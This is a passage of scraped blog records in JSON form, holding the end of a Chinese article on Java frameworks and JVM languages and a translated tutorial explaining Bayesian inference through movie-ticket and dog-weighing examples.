通过完善的内存计算和处理优化，极大的提升了速度，是具备流处理能力的下一代批处理框架。</p>\n<p>Spark 体系还包括一系列附加库，如Spark Streaming 、Spark MLlib、Spark GraphX、SparkNet、CaffeOnSpark等。</p>\n<p><strong>Kafka</strong></p>\n<p>Kafka 是 LinkedIn 使用 Scala 开发的一个分布式消息中间件，可以实现不同应用之间的松耦合，由于其可扩展、高吞吐、低延迟、高可靠等特性而被广泛使用。</p>\n<p>具体可参考：<a href=\"https://kafka.apache.org/intro\">https://kafka.apache.org/intro</a></p>\n<p><strong>ElasticSearch</strong></p>\n<p>ElasticSearch 是基于 Lucene 的实时分布式搜索引擎，由于其搜索稳定、可靠，速度快、安装方便等特点，是使用最广泛的开源搜索引擎之一。</p>\n<p>具体可参考《Elasticsearch: 权威指南》：<a href=\"https://www.elastic.co/guide/cn/elasticsearch/guide/current/index.html\">https://www.elastic.co/guide/cn/elasticsearch/guide/current/index.html</a></p>\n<p><strong>Nutch</strong></p>\n<p>Nutch 是 Apache 旗下的高度可扩展、可伸缩、可插拔的开源网络爬虫框架，功能完整。</p>\n<p>当然爬出框架还有很多：Heritrix、Crawler4j、WebCollector、WebMagic、SeimiCrawler、HtmlUnit 等，可根据实际项目需要选择。</p>\n<p>在爬虫领域，Python 可能使用的更多一些，入门也简单。</p>\n<p>爬虫的难点不在于语言的选择，无论 Java 、Python 都可以胜任，关键还是反反爬策略的制定，以及各种实战的积累。</p>\n<p><strong>ethereumj</strong></p>\n<p>ethereumj 是以太坊协议的纯 Java 实现。不过在区块链领域，Go 语言的使用率可能更高一些。开发人员可以酌情选择。</p>\n<p>代码可参考：<a href=\"https://github.com/ethereum/ethereumj\">https://github.com/ethereum/ethereumj</a></p>\n<p><strong>Deeplearning4J</strong></p>\n<p>DeepLearning4J（DL4J）是基于Java语言的分布式深度学习框架，在机器学习领域应用广泛。</p>\n<p>入门可以参考《DL4J快速入门》：<a href=\"https://deeplearning4j.org/cn/quickstart\">https://deeplearning4j.org/cn/quickstart</a></p>\n<p>不过由于谷歌的 TensorFlow 提供的 java API 也会日趋完善，目前不少 java 程序员也会选择 TensorFlow 作为机器学习的首选框架。</p>\n<p>以上只是个人正在使用或练手，并且比较看好的一些开源框架。如果想了解更多，可以去 Github 上搜索。</p>\n<p>譬如，在 GitHub 的 Search 框，输入 java stars:&gt;10000，可以搜索到星数最多、最热门的一些 Java 开源框架，如图：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/3e48861d07ac2cf1d75cc91ed59c710f.png\"></p>\n<p>如果想发掘 Java 前沿的开源项目，可以选择 Explore，点击 Trending 按钮，就可以看到近期热门的一些开源项目。</p>\n<p>可以选择 today「当天热门」、this week「一周热门」和 this month「一月热门」，还可以在右侧选择语言来查看，比如选择 Java 语言，如图：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/12a66f81788e8cbed51d8c2703199a8b.png\"></p>\n<p><em>注：觉得好的，记得点击 star，大神贡献代码也需要鼓励  :)</em></p>\n<p>可以看到，得益于最近被谷歌钦点为 Android 的官方语言，JetBrains 的 Kotlin 这一周成了最大的热门。</p>\n<p>Java 的生态圈如此繁盛，Java 离陨落还尚需时日吧。</p>\n<p>普通的 Java 程序员能更多的学习、使用这些优秀的框架，有能力的还可贡献一些代码，融入这个繁荣的生态，在我看来是上上策。</p>\n<h2><strong>JVM 语系</strong></h2>\n<p>Java 功能强大、生态丰富，已无需多言。但类型、语法与编程范式方面，存在一些局限性，也长期为人所诟病。</p>\n<p>所以，有不少开发人员试图去寻求其他语言，既可以突破 Java 的这些局限，又可以与 Java 和谐共处。</p>\n<p>Java 的祖师爷们也是非常明智，一开始就将编程语言 Java 与运行时环境 JVM 分离。</p>\n<p>JVM 负责与操作系统的交互，屏蔽了具体操作系统的细节，制订了一整套生成字节码的规范，使得前面这一构想得以顺利实施。</p>\n<p>如今有众多语言运行在 JVM 上，Groovy、Scala、Kotlin、Clojure 可能算得上是其中的佼佼者。</p>\n<p><strong>Groovy</strong></p>\n<p>Groovy 是类似 Ruby 的动态语言，适合编写脚本、插件、测试例，DSL (领域特定语言)等。知名的自动化建构工具 Gradle 主要就基于 Groovy 。</p>\n<p><strong>Scala</strong></p>\n<p>Scala 的设计初衷，就是在 JVM 上整合面向对象与函数式编程的各种特性。</p>\n<p>大名鼎鼎的大数据处理框架 Spark、消息中间件 Kafka、用于构建可容错，可扩展、高并发应用的Akka，都是基于 Scala 语言编写。</p>\n<p><strong>Kotlin</strong></p>\n<p>前几日刚升级为 Android 官方开发语言的 Kotlin ，近期是一个热门。从前面讲到的 Github 上的 star 指数也可窥见一斑。</p>\n<p>基于 Kotlin 的库和框架、官方工具的支持、教学视频、文档等，也肯定会层出不穷。</p>\n<p><strong>Clojure</strong></p>\n<p>Clojure 被认为是基于 JVM 的 Lisp 方言，是函数式编程的铁杆。知名的大数据处理框架 Storm 主要就是由 Clojure 语言编写而成。</p>\n<p><strong>Ceylon</strong></p>\n<p>Ceylon 是面向企业级应用设计开发的强静态类型编程语言，支持 Java 和 JavaScript 虚拟机。</p>\n<p>具体可参考：<a href=\"https://ceylon-lang.org/documentation/current/\">https://ceylon-lang.org/documentation/current/</a></p>\n<p>下图是 2017 年的 JVM 语言使用率调查：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/8dd51871fd25a9253ff965370e29c889.png\"></p>\n<p><em>来源：Baeldung，链接：</em><em><a href=\"http://www.baeldung.com/java-in-2017\">http://www.baeldung.com/java-in-2017</a></em></p>\n<p>注：Groovy 达到了将近40％的份额，有点出乎我的意料。另外，得益于谷歌这么推一把，Kotlin 后续的比例有望来个大跃进。</p>\n<p>2008 年开始，Oracle主办的 JVM 语言峰会，为 JVM 语系的架构师、设计师、工程师，提供了非常好的开放式合作的机遇。</p>\n<p>顺便说一下，今年的 JVM 语言峰会，时间：7月31日~8月2日，地点：Oracle Santa Clara Campus，有兴趣的童鞋可以关注一下。</p>\n<p>作为一名 Java 程序员，如果要选择第二门编程语言、或想来个多语言编程的话，选择 JVM 系的语言显然是一个非常不错的选择。</p>\n<p>选择 JVM 系语言的一大优势是，前期可以使用熟悉的 Java 搭架子，局部功能优先尝试一下新语言，如此风险最小，与 Java 可以实现无缝切换。</p>\n<p>至于具体如何选择，就要看你在功能性、实用性、舒适性、有趣性之间，如何取舍了。</p>\n<h2><strong>结语</strong></h2>\n<p><strong>Java 自身在性能、语法、编程范式等方面，也是在不断地提高改进。</strong></p>\n<p>譬如 Java 8 引入了 Lambda 表达式、Optional、Streams、Date/Time API 等，Java 9 带来了 Jigsaw（模块化）等。</p>\n<p>Java 程序员可以适时的与时俱进。</p>\n<p>不过，谷歌等其他厂商由于对 Java 不具备掌控力，还有吃官司的风险，寻求 Java 的替代方案，动机是存在的。</p>\n<p>所以，作为 Java 程序员，过于依赖 Java，也是比较有风险的。</p>\n<p><strong>适时的主动去改变，不要让自己哪天陷于被动。</strong></p>\n<p><strong>除了学习第二、第三编程语言，程序员可以把更多的重心，放在算法上。</strong></p>\n<p>以后的生活无处不算法，从娱乐影视推荐、新闻资讯过滤，到出行购物、住宿交友等等，我们都离不开算法。</p>\n<p>尽管许多优秀的算法，包括最前沿的深度学习学法，都会有大牛奉献开源实现，但只有其中的原理深刻理解了，才能掌握、并利用好这些算法。</p>\n<h2><strong>后记</strong></h2>\n<p><strong>技术的更迭，有时候会来的很突然，很猛烈。但系统的更迭，往往会慢得多。</strong></p>\n<p>譬如 Cobol 语言，尽管语言本身陨落已超过 20 年，依然能在银行、证券、保险、电信等行业领域里见到 Cobol 的身影。</p>\n<p>即使几年之后，Java 因各种阴差阳错、机缘巧合，开始走向陨落，Java 程序员们再混个 20 年，也是毫无压力。</p>\n<p><strong>因为 Java 常年占据编程语言前列（榜首），目前有太多的平台使用 Java 了。</strong></p>\n<p>Amazon、Google、eBay、阿里、京东、银行、证券、医疗、移动、电信、ERP等等。</p>\n<p>各个领域，各行各业，Java 程序员吃老本也能再吃个 20 年……</p>\n<p>当然，这只是 Java 抽中了下下签，您又恰巧选择了下下策。但愿不会如此。</p>\n<p><strong>最后，推荐一幅比较全面、而又有趣的 JVM 语系的海盗图</strong>：Pirates of the JVM</p>\n<p>链接：<em><a href=\"https://jaxenter.com/wp-content/uploads/2017/03/Pirates-of-the-JVM-JAXenter-768x4245.png\">https://jaxenter.com/wp-content/uploads/2017/03/Pirates-of-the-JVM-JAXenter-768×4245.png</a></em></p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111422\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111422votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111422\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/large/63918611gy1ffprvu5jnvj20sg0edqj7.jpg"], "fav_nums": 6, "comment_nums": 0, "create_date": "2017/06/11", "praise_nums": 2}
{"tags": " 5 评论 ,贝叶斯,数学,IT技术", "front_image_path": "full/25baaf1aee981547da4ca064aa19b977ec266622.jpg", "title": "实例详解贝叶斯推理的原理", "url_object_id": "823bb661f6166a2a99761141fa9d7c86", "url": "http://blog.jobbole.com/111399/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/qiaofeng\">乔永琪</a> 翻译，<a href=\"http://www.jobbole.com/members/tangyouhua\">唐尤华</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://www.kdnuggets.com/2016/11/how-bayesian-inference-works.html\">Brandon Rohrer</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>注：Brandon Rohrer 的原<a href=\"https://youtu.be/5NMxiOGL39M\">视频 </a>+ <a href=\"https://docs.google.com/presentation/d/1325yenZP_VdHoVj-tU0AnbQUxFwb8Fl1VdyAAUxEzfg/edit?usp=sharing\">原PPT</a>。（需梯子）</p>\n<p>贝叶斯推理是一种精确的数据预测方式。在数据没有期望的那么多，但却想毫无遗漏地，全面地获取预测信息时非常有用。</p>\n<p>提及贝叶斯推理时，人们时常会带着一种敬仰的心情。其实并非想象中那么富有魔力，或是神秘。尽管贝叶斯推理背后的数学越来越缜密和复杂，但其背后概念还是非常容易理解。简言之，贝叶斯推理有助于大家得到更有力的结论，将其置于已知的答案中。</p>\n<p>贝叶斯推理理念源自托马斯贝叶斯。三百年前，他是一位从不循规蹈矩的教会长老院牧师。贝叶斯写过两本书，一本关于神学，一本关于概率。他的工作就包括今天著名的贝叶斯定理雏形，自此以后应用于推理问题，以及有根据猜测（educated guessing）术语中。贝叶斯理念如此流行，得益于一位名叫理查·布莱斯牧师的大力推崇。此人意识到这份定理的重要性后，将其优化完善并发表。因此，此定理变得更加准确。也因此，历史上将贝叶斯定理称之为 Bayes-Price法则。</p>\n<p>译者注：educated guessing 基于(或根据)经验(或专业知识、手头资料、事实等)所作的估计(或预测、猜测、意见等)</p>\n<h3>影院中的贝叶斯推理</h3>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fgiqen6xoij20dz09943b.jpg\"></p>\n<p>试想一下，你前往影院观影，前面观影的小伙伴门票掉了，此时你想引起他们的注意。此图是他们的背影图。你无法分辨他们的性别，仅仅知道他们留了长头发。那你是说，女士打扰一下，还是说，先生打扰一下。考虑到你对男人和女人发型的认知，或许你会认为这位是位女士。（本例很简单，只存在两种发长和性别）</p>\n<p>现在将上面的情形稍加变化，此人正在排队准备进入男士休息室。依靠这个额外的信息，或许你会认为这位是位男士。此例采用常识和背景知识即可完成判断，无需思考。而贝叶斯推理是此方式的数学实现形式，得益于此，我们可以做出更加精确的预测。</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fgiqelzhcfj20qo0f0aid.jpg\"></p>\n<p>我们为电影院遇到的困境加上数字。首先假定影院中男女各占一半，100个人中，50个男人，50个女人。女人中，一半为长发，余下的25人为短发。而男人中，48位为短发，两位为长发。存在25个长发女人和2位长发男人，由此推断，门票持有者为女士的可能性很大。</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/6941baebly1fgiqel8q49j20qo0f0112.jpg\"></p>\n<p>100个在男士休息室外排队，其中98名男士，2位女士为陪同。长发女人和短发女人依旧对半分，但此处仅仅各占一种。而男士长发和短发的比例依旧保持不变，按照98位男士算，此刻短发男士有94人，长发为4人。考虑到有一位长发女士和四位长发男士，此刻最有可能的是持票者为男士。这是贝叶斯推理原理的具体案例。事先知晓一个重要的信息线索，门票持有者在男士休息室外排队，可以帮助我们做出更好的预测。</p>\n<p>为了清晰地阐述贝叶斯推理，需要花些时间清晰地定义我们的理念。不幸的是，这需要用到数学知识。除非不得已，我尽量避免此过程太过深奥，紧随我查看更多的小节，必定会从中受益。为了大家能够建立一个基础，我们需要快速地提及四个概念：概率、条件概率、联合概率以及边际概率。</p>\n<h3>概率</h3>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/6941baebly1fgiqekghoyj20qo0f0js1.jpg\"></p>\n<p>一件事发生的概率，等于该事件发生的数目除以所有事件发生的数目。观影者为一个女士的概率为50位女士除以100位观影者，即0.5 或50%。换作男士亦如此。</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fgiqejzd9nj20qo0f00tf.jpg\"></p>\n<p>而在男士休息室排列此种情形下，女士概率降至0.02，男士的概率为0.98。</p>\n<h3>条件概率</h3>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fgiqejg0fhj20qo0f0t9g.jpg\"></p>\n<p>条件概率回答了这样的问题，倘若我知道此人是位女士，其为长发的概率是多少？条件概率的计算方式和直接得到的概率一样，但它们更像所有例子中满足某个特定条件的子集。本例中，此人为女士，拥有长发的人士的条件概率，P(long hair | woman)为拥有长发的女士数目，除以女士的总数，其结果为0.5。无论我们是否考虑男士休息室外排队，或整个影院。</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/6941baebly1fgiqeiwvvgj20qo0f0js1.jpg\"></p>\n<p>同样的道理，此人为男士，拥有长发的条件概率，P(long hair | man)为0.4，不管其是否在队列中。</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/6941baebly1fgiqeiees3j20cu09iwkd.jpg\"></p>\n<p>很重要的一点，条件概率P(A | B)并不等同于P(B | A)。比如P(cute | puppy)不同于P(puppy | cute)。倘若我抱着的是小狗，可爱的概率是很高的。倘若我抱着一个可爱的东西，成为小狗的概率中等偏下。它有可能是小猫、小兔子、刺猬，甚至一个小人。</p>\n<h3>联合概率</h3>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/6941baebly1fgiqehgnuvj20qo0f0jrx.jpg\"></p>\n<p>联合概率适合回答这样的问题，此人为一个短发女人的概率为多少？找出答案需要两步。首先，我们先看概率是女人的概率，P(woman)。接着，我们给出头发短人士的概率，考虑到此人为女士，P(short hair | woman)。通过乘法，进行联合，给出联合概率，P(woman with short hair) = P(woman) * P(short hair | woman)。利用此方法，我们便可计算出我们已知的概率，所有观影中P(woman with long hair)为0.25，而在男士休息室队列中的P(woman with long hair)为0.1。不同是因为两个案例中的P(woman)不同。</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fgiqegyts7j20qo0f0q3n.jpg\"></p>\n<p>相似的，观影者中P(man with long hair) 为0.02，而在男士休息室队列中概率为0.04。</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fgiqeg3kcvj209v0bhgru.jpg\"></p>\n<p>和条件概率不同，联合概率和顺序无关，P(A and B)等同于P(B and A)。比如，同时拥有牛奶和油炸圈饼的概率，等同于拥有油炸圈饼和牛奶的概率。</p>\n<h3>边际概率</h3>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fgiqef7izlj20qo0f0wf2.jpg\"></p>\n<p>我们最后一个基础之旅为边际概率。特别适合回答这样的问题，拥有长发人士的概率？为计算出结果，我们须累加此事发生的所有概率——即男士留长发的概率加女士留长发的概率。加上这两个概率，即给出所有观影者P(long hair)的值0.27，而男休息室队列中的P(long hair)为0.05。</p>\n<h3>贝叶斯定理</h3>\n<p>现在到了我们真正关心的部分。我们想回答这样的问题，倘若我们知道拥有长发的人士，那他们是位女士或男士的概率为？这是一个条件概率，P(man | long hair)，为我们已知晓的P(long hair | man)逆方式。因为条件概率不可逆，因此，我们对这个新条件概率知之甚少。</p>\n<p>幸运的是托马斯观察到一些很酷炫的知识可以帮到我们。</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fgiqvuu70uj20hk03caa8.jpg\"></p>\n<p>根据联合概率计算规则，我们给出方程P(man with long hair)和P(long hair and man)。因为联合概率可逆，因此这两个方程等价。</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fgiqvtttirj20jk06c750.jpg\"></p>\n<p>借助一点代数知识，我们就能解出P(man | long hair)。</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/6941baebly1fgiqvtcst3j20jm039jrm.jpg\"><br>\n表达式采用A和B，替换“man”和“long hair”，于是我们得到贝叶斯定理。</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fgiqvt0iq2j20gq05zjrh.jpg\"></p>\n<p>我们回到最初，借助贝叶斯定理，解决电影院门票困境。</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/6941baebly1fgiqvsjn41j20qo0f074o.jpg\"></p>\n<p>首先，需要计算边际概率P(long hair)。</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fgiqvs4k73j20qo0f0dgf.jpg\"></p>\n<p>接着代入数据，计算出长发中是男士的概率。对于男士休息室队列中的观影者而言，P(man | long hair)微微0.8。这让我们更加确信一直觉，掉门票的可能是一男士。贝叶斯定理抓住了在此情形下的直觉。更重要的是，更重要的是吸纳了先验知识，男士休息室外队列中男士远多于女士。借用此先验知识，更新我们对一这情形的认识。</p>\n<h3>概率分布</h3>\n<p>诸如影院困境这样的例子，很好地解释了贝叶斯推理的由来，以及作用机制。然而，在数据科学应用领域，此推理常常用于数据解释。有了我们测出来的先验知识，借助小数据集便可得出更好的结论。在开始细说之前，请先允许我先介绍点别的。就是我们需要清楚一个概率分布。</p>\n<p>此处可以这样考虑概率，一壶咖啡正好装满一个杯子。倘若用一个杯子来装没有问题，那不止一个杯子呢，你需考虑如何将这些咖啡分这些杯子中。当然你可以按照自己的意愿，只要将所有咖啡放入某个杯子中。而在电影院，一个杯子或许代表女士或者男士。</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fgiqvrk4xaj20qo0f0t90.jpg\"></p>\n<p>或者我们用四个杯子代表性别和发长的所有组合分布。这两个案例中，总咖啡数量累加起来为一杯。</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fgiqvr5m4wj20qo0f0dg6.jpg\"></p>\n<p>通常，我们将杯子挨个摆放，看其中的咖啡量就像一个柱状图。咖啡就像一种信仰，此概率分布用于显示我们相信某件事情的强烈程度。</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fgiqvqqv0wj20qo0f03yk.jpg\"></p>\n<p>假设我投了一块硬币，然后盖住它，你会认为正面和反面朝上的几率是一样的。</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fgiqvqfjhzj20qo0f0wej.jpg\"></p>\n<p>假设我投了一个骰子，然后盖住它，你会认为六个面中的每一个面朝上的几率是一样的。</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fgiqvq2e9mj20qo0f0t8x.jpg\"></p>\n<p>假设我买了一期强力球彩票，你会认为中奖的可能性微乎其微。投硬币、投骰子、强力球彩票的结果，都可以视为收集、测量数据的例子。</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fgiqvpb2i5j20qo0f0glw.jpg\"></p>\n<p>毫无意外，你也可以对其它数据持有某种看法。这里我们考虑美国成年人的身高，倘若我告诉你，我见过，并测量了某些人的身高，那你对他们身高的看法，或许如上图所示。此观点认为一个人的身高可能介于150和200cm之间，最有可能的是介于180和190cm之间。</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fgiqvox3z1j20qo0f0mxk.jpg\"></p>\n<p>此分布可以分成更多的方格，视作将有限的咖啡放入更多的杯子，以期获得一组更加细颗粒度的观点。</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fgiqvo9x54j20qo0f0aah.jpg\"></p>\n<p>最终虚拟的杯子数量将非常大，以至于这样的比喻变得不恰当。这样，分布变得连续。运用的数学方法可能有点变化，但底层的理念还是很有用。此图表明了你对某一事物认知的概率分布。</p>\n<p>感谢你们这么有耐心！！有了对概率分布的介绍，我们便可采用贝叶斯定理进行数据解析了。为了说明这个，我以我家小狗称重为例。</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fgiqvnqnv2j20e90d914x.jpg\"></p>\n<h3>兽医领域的贝叶斯推理</h3>\n<p>它叫雅各宾当政，每次我们去兽医诊所，它在秤上总是各种晃动，因此很难读取一个准确的数据。得到一个准确的体重数据很重要，这是因为，倘若它的体重有所上升，那么我们就得减少其食物的摄入量。它喜欢食物胜过它自己，所以说风险蛮大的。</p>\n<p>最近一次，在它丧失耐心前，我们测了三次：13.9镑,17.5镑以及14.1镑。这是针对其所做的标准统计分析。计算这一组数字的均值，标准偏差，标准差，便可得到小狗当政的准确体重分布。</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fgiqvkrzfmj20qo0f0t98.jpg\"></p>\n<p>分布展示了我们认为的小狗体重，这是一个均值15.2镑，标准差1.2镑的正态分布。真实得测量如白线所示。不幸的是，这个曲线并非理想的宽度。尽管这个峰值为15.2镑，但概率分布显示，在13镑很容易就到达一个低值，在17镑到达一个高值。太过宽泛以致无法做出一个确信的决策。面对如此情形，通常的策略是返回并收集更多的数据，但在一些案例中此法操作性不强，或成本高昂。本例中，小狗当政的（Reign ）耐心已经耗尽，这是我们仅有的测量数据。</p>\n<p>此时我们需要贝叶斯定理，帮助我们处理小规模数据集。在使用定理前，我们有必要重新回顾一下这个方程，查看每个术语。</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fgiqvkacmhg20jq0b340y.gif\"></p>\n<p>我们用“w” (weight)和 “m” (measurements)替换“A” and “B” ，以便更清晰地表示我们如何用此定理。四个术语分别代表此过程的不同部分。</p>\n<p>先验概率，P(w)，表示已有的事物认知。本例中，表示未称量时，我们认为的当政体重w。</p>\n<p>似然值，P(m | w)，表示针对某个具体体重w所测的值m。又叫似然数据。</p>\n<p>后验概率，P(w | m)，表示称量后，当政为某个体重w的概率。当然这是我们最感兴趣的。</p>\n<p>译者注：后验概率，通常情况下，等于似然值乘以先验值。是我们对于世界的内在认知。</p>\n<p>概率数据，P(m)，表示某个数据点被测到的概率。本例中，我们假定它为一个常量，且测量本身没有偏向。</p>\n<p>对于完美的不可知论者来说，也不是什么特别糟糕的事情，而且无需对结果做出什么假设。例如本例中，即便假定当Reign的体重为13镑、或1镑，或1000000 镑，让数据说话。我们先假定一个均一的先验概率，即对所有值而言，概率分布就一常量值。贝叶斯定理便可简化为P(w | m) = P(m | w)。</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fgiqviwr9lg20jq0b3482.gif\"></p>\n<p>此刻，借助Reign的每个可能体重，我们计算出三个测量的似然值。比如，倘若当政的体重为1000镑，极端的测量值是不太可能的。然而，倘若当政的体重为14镑或16镑。我们可以遍历所有，利用Reign的每一个假设体重值，计算出测量的似然值。这便是P(m | w)。得益于这个均一的先验概率，它等同于后验概率分布 P(w | m)。</p>\n<p>这并非偶然。通过均值、标准偏差、标准差得来的，很像答案。实际上，它们是一样的，采用一个均一的先验概率给出传统的统计估测结果。峰值所在的曲线位置，均值，15.2镑也叫体重的极大似然估计（MLE）。</p>\n<p>即使采用了贝叶斯定理，但依旧离有用的估计很远。为此，我们需要非均一先验概率。先验分布表示未测量情形下对某事物的认知。均一的先验概率认为每个可能的结果都是均等的，通常都很罕见。在测量时，对某些量已有些认识。年龄总是大于零，温度总是大于-276摄氏度。成年人身高罕有超过8英尺的。某些时候，我们拥有额外的领域知识，一些值很有可能出现在其它值中。</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/6941baebly1fgiqvg3k1cj20qo0f03yy.jpg\"></p>\n<p>在Reign的案例中，我确实拥有其它的信息。我知道上次它在兽医诊所称到的体重是14.2镑。我还知道它并不是特别显胖或显瘦，即便我的胳膊对重量不是特别敏感。有鉴于此，它大概重14.2镑，相差一两镑上下。为此，我选用峰值为14.2镑。标准偏差为0.5镑的正态分布。</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fgiqvfhe8pg20qo0f07aq.gif\"></p>\n<p>先验概率已经就绪，我们重复计算后验概率。为此，我们考虑某一概率，此时Reign体重为某一特定值，比如17镑。接着，17镑这一似然值乘以测量值为17这一条件概率。接着，对于其它可能的体重，我们重复这一过程。先验概率的作用是降低某些概率，扩大另一些概率。本例中，在区间13-15镑增加更多的测量值，以外的区间则减少更多的测量值。这与均一先验概率不同，给出一个恰当的概率，当政的真实体重为17镑。借助非均匀的先验概率，17镑掉入分布式的尾部。乘以此概率值使得体重为17镑的似然值变低。</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fgiqvd2rrkj20qo0f0dgo.jpg\"></p>\n<p>通过计算当政每一个可能的体重概率，我们得到一个新的后验概率。后验概率分布的峰值也叫最大后验概率（MAP），本例为14.1镑。这和均一先验概率有明显的不同。此峰值更窄，有助于我们做出一个更可信的估测。现在来看，小狗当政的体重变化不大，它的体型依旧如前。</p>\n<p>通过吸收已有的测量认知，我们可以做出一个更加准确的估测，其可信度高于其他方法。这有助于我们更好地使用小量数据集。先验概率赋予17.5镑的测量值是一个比较低的概率。这几乎等同于反对此偏离正常值的测量值。不同于直觉和常识的异常检测方式，贝叶斯定理有助于我们采用数学的方式进行异常检测。</p>\n<p>另外，假定术语P(m)是均一的，但恰巧我们知道称量存在某种程度的偏好，这将反映在P(m)中。若称量仅输出某些数字，或返回读数2.0，占整个时间的百分之10，或第三次尝试产生一个随机测量值，均需要手动修改P(m)以反映这一现象，以便后验概率更加准确。</p>\n<h3>规避贝叶斯陷阱</h3>\n<p>探究Reign的真实体重体现了贝叶斯的优势。但这也存在某些陷阱。通过一些假设我们改进了估测，而测量某些事物的目的就是为了了解它。倘若我们假定对某一答案有所了解，我们可能会删改此数据。马克·吐温对强先验的危害做了简明地阐述，“将你陷入困境的不是你所不知道的，而是你知道的那些看似正确的东西。”</p>\n<p>假如采取强先验假设，当Reign的体重在13与15镑之间，再假如其真实体重为12.5镑，我们将无法探测到。先验认知认为此结果的概率为零，不论做多少次测量，低于13镑的测量值都认为无效。</p>\n<p>幸运的是，有一种两面下注的办法，可以规避这种盲目地删除。针对对于每一个结果至少赋予一个小的概率，倘若借助物理领域的一些奇思妙想，当政确实能称到1000镑，那我们收集的测量值也能反映在后验概率中。这也是正态分布作为先验概率的原因之一。此分布集中了我们对一小撮结果的大多数认识，不管怎么延展，其尾部再长都不会为零。</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/6941baebly1fgiqvbjmplj20870a3tck.jpg\"></p>\n<p>在此，红桃皇后是一个很好的榜样：</p>\n<blockquote><p>爱丽丝笑道：“试了也没用，没人会相信那些不存在的事情。”</p>\n<p>“我敢说你没有太多的练习”，女王回应道，“我年轻的时候，一天中的一个半小时都在闭上眼睛，深呼吸。为何，那是因为有时在早饭前，我已经意识到存在六种不可能了。”来自刘易斯·卡罗尔的《爱丽丝漫游奇境》</p></blockquote>\n<p>更正：感谢那些指出错别字和其它错误的热心人士。Justin Fortier 和 Irina Max，我欠你们一杯自选饮料。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/08/0e7f3ed833bce2ad9a7586304992d287.png\">\n            \n                            <img 